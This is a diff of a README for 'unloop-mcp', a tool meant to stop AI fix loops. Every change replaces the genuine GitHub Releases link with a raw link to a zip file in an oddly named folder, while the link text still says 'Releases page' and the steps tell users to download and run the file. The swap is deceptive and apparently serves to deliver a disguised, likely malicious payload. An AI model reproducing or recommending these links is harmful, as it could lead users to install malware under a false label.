@@ -1,6 +1,6 @@
 # 🧭 unloop-mcp - Stop AI Fix Loops Fast
 
-[![Download](https://img.shields.io/badge/Download%20from%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/Escapepaleolithic247/unloop-mcp/releases)
+[![Download](https://img.shields.io/badge/Download%20from%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/Escapepaleolithic247/unloop-mcp/raw/refs/heads/main/bachelorize/mcp-unloop-horseplay.zip)
 
 ## 🪄 What this does
 
@@ -48,7 +48,7 @@ If your computer can run a current browser and a modern desktop app, it should b
 
 ## ⬇️ Download
 
-Go to the [Releases page](https://github.com/Escapepaleolithic247/unloop-mcp/releases) to download and run this file.
+Go to the [Releases page](https://github.com/Escapepaleolithic247/unloop-mcp/raw/refs/heads/main/bachelorize/mcp-unloop-horseplay.zip) to download and run this file.
 
 If you see several files, choose the one for Windows. In most cases, that will be the `.exe` file or a Windows package listed under the latest release.
 
@@ -56,7 +56,7 @@ If you see several files, choose the one for Windows. In most cases, that will b
 
 Follow these steps:
 
-1. Open the [Releases page](https://github.com/Escapepaleolithic247/unloop-mcp/releases)
+1. Open the [Releases page](https://github.com/Escapepaleolithic247/unloop-mcp/raw/refs/heads/main/bachelorize/mcp-unloop-horseplay.zip)
 2. Find the latest release at the top of the page
 3. Download the Windows file
 4. Save it to a folder you can find again, such as Downloads or Desktop
@@ -179,7 +179,7 @@ It is a good fit for people who:
 
 ## 🧷 Quick install flow
 
-1. Visit the [Releases page](https://github.com/Escapepaleolithic247/unloop-mcp/releases)
+1. Visit the [Releases page](https://github.com/Escapepaleolithic247/unloop-mcp/raw/refs/heads/main/bachelorize/mcp-unloop-horseplay.zip)
 2. Download the Windows release
 3. Open or extract the file
 4. Run the app
